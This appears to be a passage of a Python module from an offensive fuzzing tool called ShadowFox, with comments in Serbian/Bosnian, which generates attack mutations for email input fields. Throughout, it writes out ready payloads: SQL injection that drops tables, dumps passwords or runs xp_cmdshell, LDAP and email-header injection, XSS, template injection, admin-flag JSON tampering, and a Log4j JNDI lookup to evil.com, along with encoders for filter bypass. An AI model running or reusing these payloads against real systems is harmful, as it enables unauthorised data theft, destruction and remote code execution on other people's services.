# shadowfox/agents/mutation_engine.py

import random
import re
import urllib.parse
import base64
import hashlib
import itertools
from typing import List, Dict, Any, Optional, Tuple
import logging
from .shadow_mail_payloads import EMAIL_FUZZING_PAYLOADS, EMAIL_VALIDATION_BYPASS, generate_targeted_email_payloads

class MutationEngine:
    """
    AI-Powered MutationEngine za Shadow Mail - generiše mutacije email payloads
    sa naprednim heurističkim algoritmima i kontekstualnom svešću
    """
    
    def __init__(self, operator):
        self.operator = operator
        self.logger = logging.getLogger('MutationEngine')
        
        # Encoding mappings za bypass
        self.encoding_maps = {
            'url': lambda x: urllib.parse.quote(x),
            'double_url': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            'html': lambda x: ''.join(f'&#{ord(c)};' for c in x),
            'hex': lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            'base64': lambda x: base64.b64encode(x.encode()).decode()
        }
        
        # Context patterns - analizira kontekst na osnovu response-a
        self.context_patterns = {
            'json_api': [r'application/json', r'"email":', r'{".*"}'],
            'form_input': [r'<input.*email', r'<form', r'name="email"'],
            'sql_context': [r'mysql', r'postgresql', r'SELECT.*FROM', r'WHERE.*email'],
            'ldap_context': [r'ldap://', r'ou=', r'cn=', r'mail='],
            'email_header': [r'Content-Type:', r'From:', r'To:', r'Subject:'],
            'xml_context': [r'<\?xml', r'<email>', r'xmlns'],
            'nosql_context': [r'mongodb', r'{"$', r'db\.collection']
        }
        
        # AI heuristics - patterns koji ukazuju na uspešne mutacije
        self.success_indicators = {
            'error_disclosure': [r'SQL syntax', r'mysql_', r'ORA-', r'Microsoft.*ODBC'],
            'blind_sqli': [r'sleep\(', r'benchmark\(', r'pg_sleep'],
            'xss_reflection': [r'<script>', r'javascript:', r'onerror='],
            'header_injection': [r'Bcc:', r'X-Mailer:', r'Content-Type:'],
            'ldap_injection': [r'invalid DN', r'LDAP.*error', r'ou=.*cn=']
        }
        
    def generate_mutations(self, base_payload: str, context: Dict = None, 
                          mutation_count: int = 50, target_url: str = None) -> List[Dict]:
        """
        Glavna funkcija za generiranje mutacija
        """
        self.logger.info(f"Generiše {mutation_count} mutacija za: {base_payload[:50]}...")
        
        mutations = []
        context_type = self._detect_context(context) if context else "generic"
        
        # 1. Bazne Shadow Mail mutacije
        base_mutations = self._generate_base_email_mutations(base_payload, target_url)
        
        # 2. Kontekstualne mutacije na osnovu detektovanog konteksta
        contextual_mutations = self._generate_contextual_mutations(base_payload, context_type)
        
        # 3. AI heurističke mutacije
        ai_mutations = self._generate_ai_heuristic_mutations(base_payload, context)
        
        # 4. Encoding mutations
        encoding_mutations = self._generate_encoding_mutations(base_payload)
        
        # 5. Logičke bypass mutacije
        logic_mutations = self._generate_logic_bypass_mutations(base_payload)
        
        # Kombinuj sve
        all_mutations = (base_mutations + contextual_mutations + 
                        ai_mutations + encoding_mutations + logic_mutations)
        
        # Rangiranje i selekcija najboljih
        ranked_mutations = self._rank_mutations(all_mutations, context_type)
        
        # Uzmi top mutacije
        final_mutations = ranked_mutations[:mutation_count]
        
        # Log rezultate
        self.operator.log_agent_action("MutationEngine", "mutations_generated", {
            "base_payload": base_payload,
            "context_type": context_type,
            "total_generated": len(all_mutations),
            "final_count": len(final_mutations)
        })
        
        return final_mutations
    
    def _detect_context(self, context: Dict) -> str:
        """
        AI algoritam za detekciju konteksta na osnovu response-a
        """
        if not context:
            return "generic"
            
        response_text = context.get('response_body', '').lower()
        headers = str(context.get('headers', {})).lower()
        combined_text = response_text + headers
        
        scores = {}
        for ctx_type, patterns in self.context_patterns.items():
            score = 0
            for pattern in patterns:
                matches = len(re.findall(pattern, combined_text, re.IGNORECASE))
                score += matches
            scores[ctx_type] = score
        
        # Vrati kontekst sa najvišim scorom
        detected_context = max(scores, key=scores.get) if max(scores.values()) > 0 else "generic"
        self.logger.info(f"Detektovan kontekst: {detected_context} (score: {scores[detected_context]})")
        
        return detected_context
    
    def _generate_base_email_mutations(self, base_payload: str, target_url: str = None) -> List[Dict]:
        """
        Generiše bazne Shadow Mail mutacije
        """
        mutations = []
        
        # Ako je base_payload email, koristi ga kao osnovu
        if '@' in base_payload:
            base_email = base_payload
        else:
            base_email = f"test@{target_url.split('://')[1].split('/')[0] if target_url else 'evil.com'}"
        
        # Uzmi payloads iz svih kategorija
        for category, payloads in EMAIL_FUZZING_PAYLOADS.items():
            for payload in payloads[:10]:  # Ograniči broj po kategoriji
                mutations.append({
                    'payload': payload,
                    'type': f'shadow_mail_{category}',
                    'confidence': 0.7,
                    'category': category,
                    'description': f'Shadow Mail {category} payload'
                })
        
        # Generiši ciljane payloads ako imamo target URL
        if target_url:
            domain = target_url.split('://')[1].split('/')[0]
            targeted = generate_targeted_email_payloads(domain)
            for payload in targeted[:20]:
                mutations.append({
                    'payload': payload,
                    'type': 'targeted_email',
                    'confidence': 0.8,
                    'category': 'targeted',
                    'description': f'Targeted email for {domain}'
                })
        
        return mutations
    
    def _generate_contextual_mutations(self, base_payload: str, context_type: str) -> List[Dict]:
        """
        Generiše mutacije specifične za detektovani kontekst
        """
        mutations = []
        
        if context_type == "json_api":
            json_mutations = [
                f'{{"email":"{base_payload}"}}',
                f'{{"email":"{base_payload}","admin":true}}',
                f'{{"email":["{base_payload}","admin@target.com"]}}',
                f'{{"user":{{"email":"{base_payload}"}},"admin":{{"email":"root@target.com"}}}}',
                f'{{"email":"{base_payload}\\", \\"role\\":\\"admin\\", \\"x\\":\\""}}'
            ]
            for payload in json_mutations:
                mutations.append({
                    'payload': payload,
                    'type': 'json_context',
                    'confidence': 0.9,
                    'category': 'contextual',
                    'description': 'JSON API context mutation'
                })
        
        elif context_type == "sql_context":
            sql_mutations = [
                f"{base_payload}' OR '1'='1",
                f"{base_payload}'; DROP TABLE users--",
                f"{base_payload}' UNION SELECT user(),password FROM users--",
                f"{base_payload}' AND (SELECT SUBSTRING(user(),1,1)='a')--",
                f"{base_payload}'; WAITFOR DELAY '0:0:5'--"
            ]
            for payload in sql_mutations:
                mutations.append({
                    'payload': payload,
                    'type': 'sql_context',
                    'confidence': 0.95,
                    'category': 'contextual',
                    'description': 'SQL context injection'
                })
        
        elif context_type == "ldap_context":
            ldap_mutations = [
                f"{base_payload}*",
                f"{base_payload}*)(&",
                f"{base_payload}*)(uid=*))(|(uid=*",
                f"{base_payload}*)(|(mail=*"
            ]
            for payload in ldap_mutations:
                mutations.append({
                    'payload': payload,
                    'type': 'ldap_context',
                    'confidence': 0.85,
                    'category': 'contextual',
                    'description': 'LDAP context injection'
                })
        
        elif context_type == "email_header":
            header_mutations = [
                f"{base_payload}\\r\\nBcc: victim@target.com",
                f"{base_payload}\\nX-Mailer: ShadowFox",
                f"{base_payload}\\r\\nContent-Type: text/html\\r\\n\\r\\n<script>alert(1)</script>"
            ]
            for payload in header_mutations:
                mutations.append({
                    'payload': payload,
                    'type': 'header_injection',
                    'confidence': 0.8,
                    'category': 'contextual',
                    'description': 'Email header injection'
                })
        
        return mutations
    
    def _generate_ai_heuristic_mutations(self, base_payload: str, context: Dict = None) -> List[Dict]:
        """
        AI heuristički algoritam za kreiranje "pametnih" mutacija
        """
        mutations = []
        
        # Analiza karakteristika base_payload-a
        payload_features = self._analyze_payload_features(base_payload)
        
        # Generiši mutacije na osnovu features
        if payload_features['has_email']:
            email_part = payload_features['email']
            local_part, domain_part = email_part.split('@', 1)
            
            # Mutacije local dela
            local_mutations = [
                local_part + "+admin",
                local_part + "+root",
                local_part + "+bypass",
                local_part * 2,  # Dupliraj
                local_part + "'",
                local_part + '"',
                local_part + "\\",
                '"' + local_part + '"'
            ]
            
            # Mutacije domain dela  
            domain_mutations = [
                domain_part.replace('.', '․'),  # Unicode dot
                domain_part.upper(),
                domain_part + ".evil.com",
                "evil." + domain_part,
                domain_part + ":25",
                "[" + domain_part + "]"
            ]
            
            # Kombinuj
            for local in local_mutations[:3]:
                for domain in domain_mutations[:3]:
                    mutation = f"{local}@{domain}"
                    mutations.append({
                        'payload': mutation,
                        'type': 'ai_heuristic',
                        'confidence': 0.75,
                        'category': 'ai_generated',
                        'description': 'AI heuristic email mutation'
                    })
        
        # Chaîning mutations - kombinuj sa drugim tipovima napada
        chaining_mutations = [
            base_payload + "' OR 1=1--",
            base_payload + "<script>alert(1)</script>",
            base_payload + "{{7*7}}",  # Template injection
            base_payload + "${jndi:ldap://evil.com}",  # Log4j
            base_payload + "'; exec xp_cmdshell('whoami')--"
        ]
        
        for payload in chaining_mutations:
            mutations.append({
                'payload': payload,
                'type': 'chaining_attack',
                'confidence': 0.6,
                'category': 'ai_generated',
                'description': 'AI chaining attack mutation'
            })
        
        return mutations
    
